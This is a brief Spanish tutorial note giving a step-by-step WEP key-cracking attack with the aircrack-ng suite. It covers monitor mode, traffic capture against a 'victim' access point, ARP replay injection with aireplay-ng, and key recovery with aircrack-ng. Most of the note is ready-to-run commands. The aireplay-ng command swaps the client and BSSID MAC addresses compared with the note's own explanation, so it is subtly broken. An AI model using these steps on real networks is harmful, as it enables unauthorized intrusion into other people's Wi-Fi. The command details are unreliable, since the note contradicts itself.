# Ataque Con ARP Replay Request
Para realizar una ataque [[ARP Replay Request]] para redes WEB, utilizaremos la herramienta [[Airmon-ng]].

	airmon-ng start wlan1
Vamos a poner la tarjeta de red en modo monitor.

-wlan1 *Tarjeta de red que vamos a poner ne modo monitor*

	airodump-ng -c 10 wlan1mon
Escanear el aire en busca de la victima en la interfaz monitor.

-wlan1mon *nombre de la tarjeta de red que aparece al momento de ejecutar ifconfig*
-c 10 *solo escanea en el canal deseado*

	macchanger -s
Obetener mi direccion MAC.

	airodump-ng -w capturas2 -c 1 --bssid C0:B5:D7:F6:71:05 wlan1mon
Obtener el trafico de la red.

-w *capturas ubicacion donde se guardaran las capturas de la red.*
-c 1 *especificamos el canal cual esta el access point de la victima.*
 --bssid *direccion mac de la red victima.*
 wlan1mon *interfaz de red con la cual deseamos escaner el trafico de la red victima.*
 
 Resultado de las capturas capturas2-01.cap 

	airplay-ng -3 -h C0:B5:D7:F6:71:05 -b 74:23:44:A9:C7:67 wlan1mon
Realizar ataque ARP Replay Request, hace que atrape los ARP request y enviandolos al access point.

-3 *Indicacion de ataque ARP Replay Request.*
-h 74:23:44:A9:C7:67 *MAC del cliente conectado a la red.*
-b C0:B5:D7:F6:71:05 *bssid de la red.*
-wlan1mon *tarjeta de red en modo monitor*
	
Resultado generamos mas trafico en la red y capturamos mas IVs que viajan por la red, una vez obtenido la mayor cantidad de datos ejecutamos aircrack.

	
	aircrack-ng capturas2-01.cap 
Esto va a proceder a probar los diferentes IVs que se obtuvieron, aircrack va ir provando los diferentes IVs para al final obtener la clave.

	





